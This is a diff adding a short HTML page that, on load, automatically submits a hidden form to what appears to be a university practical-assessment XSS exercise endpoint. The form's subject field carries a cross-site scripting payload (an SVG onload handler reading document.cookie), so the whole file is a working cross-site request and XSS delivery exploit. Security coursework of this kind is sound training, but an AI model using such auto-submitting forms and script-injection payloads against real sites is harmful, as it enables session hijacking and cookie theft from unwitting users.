@@ -1,0 +1,14 @@
+<html>
+<body>
+    <form id="xssForm" action="https://inte2102.semiregular.space/Practical_Assessment/1/XSS/%7Bea8286f5-bf8f-460d-94fb-2a38c106d9dc%7D/ex8/" method="POST">
+        <input type="hidden" name="name" value="attacker">
+        <input type="hidden" name="email" value="attacker@example.com">
+        <input type="hidden" name="subject" value="<svg onload=alert(document.cookie)>">
+        <input type="hidden" name="body" value="Test body with XSS payload.">
+    </form>
+
+    <script>
+        document.getElementById('xssForm').submit();
+    </script>
+</body>
+</html>
